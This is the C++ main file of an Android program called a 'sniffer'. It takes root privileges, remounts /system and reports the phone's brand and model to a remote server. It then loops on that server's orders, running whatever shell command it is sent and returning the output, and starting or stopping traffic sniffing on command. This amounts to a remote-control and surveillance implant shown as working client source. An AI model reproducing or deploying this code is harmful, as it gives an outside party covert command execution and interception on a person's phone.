/*
 * SnifferMain.cpp
 *
 *  Created on: 2014年3月3日
 *      Author: Kingsley Yau
 *      Email: Kingsleyyau@gmail.com
 */

#include "Sniffer.h"
#include "SnifferClient.h"

#include <common/command.h>
#include <json/json/json.h>

int main(int argc, char** argv) {
	char stra[16] = {'\0'};
	sprintf(stra, "%d", argc);

	if(2 == argc) {
		if(0 == strcmp(argv[1], "-v")) {
			printf("%s%s%s\n", SinfferVersionString, SnifferVersion, SnifferVersionEnd);
			return 0;
		}
	}

	int uid = 0, gid = 0;
	if(setgid(gid) || setuid(uid)) {
		ELog("sniffer", "权限不够, 请提升至管理员权限再运行程序!");
		return 0;
	}

	if( !MountSystem() ) {
		ELog("sniffer", "重新挂载/system失败, 日志文件可能无法保存!");
	}

	KLog::SetLogDirectory("/sdcard/sniffer/");
	FileLog(SnifferLogFileName, "sniffer启动, 版本:%s", SnifferVersion);

	// 获取手机信息
	GetPhoneInfo();

	Sniffer sniffer;
	SnifferClient snifferClient;

	Json::Value root;
	Json::FastWriter writer;
	string param;

	SCMD scmd;
	int seq = 0;

	while(1) {
		FileLog(SnifferLogFileName, "等待连接服务端...");

		if( snifferClient.ConnectServer() ) {
			// 连接上服务端, 发送手机型号/手机号
			FileLog(
					SnifferLogFileName,
					"已经连接上服务端, 发送手机信息, [ "
					"厂商 : %s, "
					"型号 : %s, "
					"手机号 : %s "
					"]",
					GetPhoneBrand().c_str(),
					GetPhoneModel().c_str(),
					""
					);

			root.clear();
			root[PHONE_INFO_BRAND] = GetPhoneBrand();
			root[PHONE_INFO_MODEL] = GetPhoneModel();
			root[PHONE_INFO_NUMBER] = "";
			param = writer.write(root);

			bzero(&scmd, sizeof(SCMD));
			scmd.header.scmdt = SnifferTypeClientInfoResult;
			scmd.header.bNew = true;
			scmd.header.seq = seq++;
			scmd.header.len = MIN(param.length(), MAX_PARAM_LEN - 1);
			memcpy(scmd.param, param.c_str(), param.length());
			scmd.param[scmd.header.len] = '\0';
			snifferClient.SendCommand(scmd);

			FileLog(SnifferLogFileName, "等待接收命令...");

			bool bCanRecv = true;
			while(bCanRecv) {
				// 开始接收命令
				SCMD scmd;
				snifferClient.RecvCommand(scmd);

				switch(scmd.header.scmdt) {
				case ExcuteCommand:{
					// 执行Shell命令
					string cmd = scmd.param;
					string result = SystemComandExecuteWithResult(cmd);
					FileLog(SnifferLogFileName, "执行:(%s)", cmd.c_str());
					FileLog(SnifferLogFileName, "执行结果:(%s)", result.c_str());

					// 返回命令结果
					SCMD scmdSend;
					scmdSend.header.scmdt = ExcuteCommandResult;
					scmdSend.header.bNew = false;
					scmdSend.header.seq = scmd.header.seq;
					scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
					memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
					scmdSend.param[scmdSend.header.len] = '\0';
					snifferClient.SendCommand(scmdSend);

				}break;
				case SinfferTypeStart:{
					// 开始监听
					FileLog(SnifferLogFileName, "开始监听...");
					sniffer.StartSniffer();

				}break;
				case SinfferTypeStop:{
					// 停止监听
					sniffer.StopSniffer();

				}break;
				case SinfferTypeVersion:{
					// 返回版本
					FileLog(SnifferLogFileName, "返回版本号:%s", SnifferVersion);

					SCMD scmdSend;
					scmdSend.header.scmdt = SinfferTypeVersionResult;
					scmdSend.header.bNew = false;
					scmdSend.header.seq = scmd.header.seq;
					scmdSend.header.len = MIN(strlen(SnifferVersion), MAX_PARAM_LEN - 1);
					memcpy(scmdSend.param, SnifferVersion, scmdSend.header.len);
					scmdSend.param[scmdSend.header.len] = '\0';
					snifferClient.SendCommand(scmdSend);

				}break;
				case SinfferTypeNone:{
					// 与服务端连接已经断开
					FileLog(SnifferLogFileName, "与服务端连接已经断开!");
					bCanRecv = false;

				}break;
				default:break;
				}
			}
		}
		sleep(30);
	}

	FileLog(SnifferLogFileName, "sniffer退出!");
	return 1;
}
